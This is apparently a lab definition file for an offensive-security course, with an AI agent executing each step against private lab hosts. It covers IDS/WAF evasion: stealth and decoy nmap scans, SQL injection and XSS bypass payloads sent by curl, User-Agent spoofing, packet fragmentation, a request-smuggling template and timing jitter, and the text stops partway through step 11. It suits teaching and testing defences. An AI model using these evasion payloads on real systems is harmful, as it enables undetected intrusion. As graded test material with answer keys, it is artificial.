lab_id: attack-ai-week12
title: 은닉 기법 (Evasion) (AI 지원)
version: ai
course: attack-ai
week: 12
description: IDS/IPS, WAF, 안티바이러스 등 보안 장비의 탐지를 우회하는 은닉(Evasion) 기법을 실습한다. 패킷 분할, 인코딩,
  난독화, 타이밍 기법 등을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- Suricata IDS/IPS의 탐지 규칙을 이해하고 우회 방법을 실습한다
- WAF 우회 기법(인코딩, 대소문자 혼합, 주석 삽입)을 수행할 수 있다
- 공격 도구의 시그니처를 변경하여 탐지를 회피할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: secu 서버({{SECU_IP}})의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악하라.
  hint: SSH로 secu에 접속하여 Suricata 규칙 파일을 확인한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: secu 서버(10.20.30.1)의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악해줘

    📎 참고 (CLI): ssh ccc@10.20.30.1 ''ls /etc/suricata/rules/ 2>/dev/null; echo ---;
    cat /etc/suricata/rules/local.rules 2>/dev/null | head -20'' 2>/dev/null'
  answer_detail: IDS/IPS 규칙을 사전에 파악하면 탐지를 우회하는 페이로드를 설계할 수 있다. Suricata는 시그니처 기반 탐지를
    사용하므로 규칙에 매칭되지 않는 변형 공격은 탐지되지 않는다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.1 'ls /etc/suricata/rules/ 2>/dev/null; echo ---; cat /etc/suricata/rules/local.rules
    2>/dev/null | head -20' 2>/dev/null
  risk_level: low
  bastion_prompt: secu 서버(10.20.30.1)의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악해줘
- order: 2
  instruction: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용하라. 느린 타이밍(-T1), 패킷 분할(-f), 디코이(-D)를
    사용하라.
  hint: -T1은 Sneaky 타이밍, -f는 패킷 분할, -D는 디코이이다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용해줘

    📎 참고 (CLI): sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null
    | head -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3
    random decoys'''
  answer_detail: -T1(Sneaky)은 패킷 전송 간격을 15초로 늘려 IDS의 시간 기반 탐지를 회피한다. -f는 패킷을 8바이트
    단위로 분할하여 시그니처 매칭을 방해한다. -D는 디코이 IP를 추가하여 실제 스캐너를 식별하기 어렵게 만든다.
  verify:
    type: output_contains
    expect: Stealth scan
    field: stdout
  target_vm: attacker
  script: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head
    -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3 random
    decoys'''
  risk_level: medium
  bastion_prompt: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용해줘
- order: 3
  instruction: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형하라. 대소문자 혼합, 주석 삽입, 인코딩 등을 적용하라.
  hint: UNION SELECT를 uNiOn SeLeCt, UN/**/ION SE/**/LECT 등으로 변형한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형해줘

    📎 참고 (CLI): echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn
    SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL
    encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54'' && echo ''4. Double URL encoding:
    %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6.
    Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
    | head -c 200'
  answer_detail: WAF는 보통 정규표현식으로 공격 패턴을 탐지한다. 대소문자 혼합, SQL 주석(/**/)을 이용한 키워드 분할, URL
    이중 인코딩 등으로 정규표현식 매칭을 우회할 수 있다.
  verify:
    type: output_contains
    expect: SQLi Evasion
    field: stdout
  target_vm: attacker
  script: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn
    SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL
    encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54'' && echo ''4. Double URL encoding:
    %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6.
    Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
    | head -c 200'
  risk_level: medium
  bastion_prompt: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형해줘
- order: 4
  instruction: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연하라.
  hint: 이벤트 핸들러(onerror, onload), SVG, img 태그 등을 활용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을
    시연해줘

    📎 참고 (CLI): echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler:
    <img src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo
    ''3. Body: <body onload=alert(1)>'' && echo ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>''
    && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
    && echo ''6. Template literal: ${alert(1)}'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>''
    | head -c 200'
  answer_detail: WAF가 <script> 태그를 차단해도 HTML 이벤트 핸들러(onerror, onload, onfocus), SVG
    태그, data URI 등 다양한 경로로 JavaScript를 실행할 수 있다. WAF 우회는 끊임없는 공격-방어 경쟁이다.
  verify:
    type: output_contains
    expect: XSS Evasion
    field: stdout
  target_vm: attacker
  script: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img
    src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3.
    Body: <body onload=alert(1)>'' && echo ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>''
    && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
    && echo ''6. Template literal: ${alert(1)}'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>''
    | head -c 200'
  risk_level: medium
  bastion_prompt: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연해줘
- order: 5
  instruction: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회하라.
  hint: --source-port 또는 -g 옵션으로 소스 포트를 지정한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회해줘

    📎 참고 (CLI): sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo ''---'' && echo
    ''Source port 53 (DNS) often allowed through firewalls'''
  answer_detail: 일부 방화벽은 DNS(53), HTTP(80) 소스 포트에서 오는 패킷을 허용한다. nmap의 -g 옵션으로 소스 포트를
    위장하면 이러한 규칙을 우회할 수 있다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
  target_vm: attacker
  script: sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo '---' && echo 'Source
    port 53 (DNS) often allowed through firewalls'
  risk_level: medium
  bastion_prompt: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회해줘
- order: 6
  instruction: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를 사용하라.
  hint: 'curl -H ''User-Agent: ...'' 옵션으로 헤더를 변경한다'
  category: exploit
  points: 10
  answer: '🤖 프롬프트: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를
    사용해줘

    📎 참고 (CLI): echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000
    2>/dev/null | grep -i server && echo ''=== Spoofed (Chrome) ==='' && curl -sI
    -H ''User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000 2>/dev/null
    | grep -i server && echo ''---'' && echo ''WAFs often block known scanner User-Agents
    (Nikto, sqlmap, Nmap)'''
  answer_detail: WAF와 IDS는 알려진 공격 도구(Nikto, sqlmap, Nmap Scripting Engine)의 User-Agent를
    시그니처로 탐지한다. 정상 브라우저 UA로 위장하면 이러한 기본 탐지를 우회할 수 있다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000 2>/dev/null
    | grep -i server && echo ''=== Spoofed (Chrome) ==='' && curl -sI -H ''User-Agent:
    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
    Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000 2>/dev/null | grep -i
    server && echo ''---'' && echo ''WAFs often block known scanner User-Agents (Nikto,
    sqlmap, Nmap)'''
  risk_level: medium
  bastion_prompt: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를
    사용해줘
- order: 7
  instruction: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송하라.
  hint: hping3 -f 옵션으로 패킷을 분할한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송해줘

    📎 참고 (CLI): sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo
    ''---'' && echo ''IP fragmentation splits payload across multiple packets'' &&
    echo ''IDS must reassemble fragments to detect signatures'' && echo ''Some IDS
    fail to reassemble overlapping or out-of-order fragments'''
  answer_detail: IP 분할은 패킷을 여러 조각으로 나누어 IDS의 시그니처 매칭을 방해한다. IDS가 모든 프래그먼트를 올바르게 재조립하지
    못하면 공격 페이로드를 탐지할 수 없다.
  verify:
    type: output_contains
    expect: fragmentation
    field: stdout
  target_vm: attacker
  script: sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo '---'
    && echo 'IP fragmentation splits payload across multiple packets' && echo 'IDS
    must reassemble fragments to detect signatures' && echo 'Some IDS fail to reassemble
    overlapping or out-of-order fragments'
  risk_level: medium
  bastion_prompt: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송해줘
- order: 8
  instruction: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
    헤더를 조작하라.
  hint: CL과 TE 헤더를 동시에 사용하여 불일치를 만든다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
    헤더를 조작해줘

    📎 참고 (CLI): echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:''
    && echo ''POST / HTTP/1.1'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
    chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
    ''---'' && echo ''When front-end (WAF) uses CL and back-end uses TE,'' && echo
    ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
    bypasses WAF inspection entirely'''
  answer_detail: HTTP Request Smuggling은 프론트엔드(WAF/로드밸런서)와 백엔드 서버의 HTTP 파싱 차이를 악용한다.
    CL과 TE 헤더가 동시에 존재할 때 각 서버가 다르게 해석하면 WAF를 완전히 우회하는 요청을 삽입할 수 있다.
  verify:
    type: output_contains
    expect: Request Smuggling
    field: stdout
  target_vm: attacker
  script: 'echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:'' && echo
    ''POST / HTTP/1.1'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
    chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
    ''---'' && echo ''When front-end (WAF) uses CL and back-end uses TE,'' && echo
    ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
    bypasses WAF inspection entirely'''
  risk_level: medium
  bastion_prompt: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
    헤더를 조작해줘
- order: 9
  instruction: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석하라.
  hint: secu 서버의 /var/log/suricata/fast.log를 확인한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석해줘

    📎 참고 (CLI): ssh ccc@10.20.30.1 ''tail -30 /var/log/suricata/fast.log 2>/dev/null
    || echo "No alerts found"'' 2>/dev/null'
  answer_detail: Suricata의 fast.log에는 탐지된 이벤트의 시간, 소스/목적지 IP, 규칙 ID, 메시지가 기록된다. 어떤
    공격이 탐지되었는지 분석하면 은닉 기법의 효과를 평가할 수 있다.
  verify:
    type: output_contains
    expect: alert
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.1 'tail -30 /var/log/suricata/fast.log 2>/dev/null || echo
    "No alerts found"' 2>/dev/null
  risk_level: low
  bastion_prompt: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석해줘
- order: 10
  instruction: 타이밍 기반 은닉을 시연하라. 요청 간 랜덤 지연을 추가하여 IDS의 시간 기반 상관 분석을 우회하라.
  hint: sleep 명령에 랜덤 값을 사용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 타이밍 기반 은닉을 시연해줘

    📎 참고 (CLI): for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay
    ${DELAY}s"; curl -s -o /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products;
    echo; sleep $DELAY; done && echo ''---'' && echo ''Random delays break IDS time-correlation
    patterns'''
  answer_detail: IDS/IPS는 일정한 간격의 반복 요청을 스캔이나 브루트포스로 탐지한다. 랜덤 지연을 추가하면 패턴이 사라져 시간
    기반 탐지를 우회할 수 있다. 실전에서는 수 초~수 분의 변동을 적용한다.
  verify:
    type: output_contains
    expect: Random delays
    field: stdout
  target_vm: attacker
  script: 'for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay ${DELAY}s";
    curl -s -o /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products;
    echo; sleep $DELAY; done && echo ''---'' && echo ''Random delays break IDS time-correlation
    patterns'''
  risk_level: medium
  bastion_prompt: 타이밍 기반 은닉을 시연해줘
- order: 11
  instruction: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고 접근을
    시도하라.
  hint: ip -6 addr 명령으로 IPv6 주소를 확인한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고
    접근을 시도해줘

    📎 참고 (CLI): ssh ccc@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null &&
    echo ''---'' && echo ''IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic''
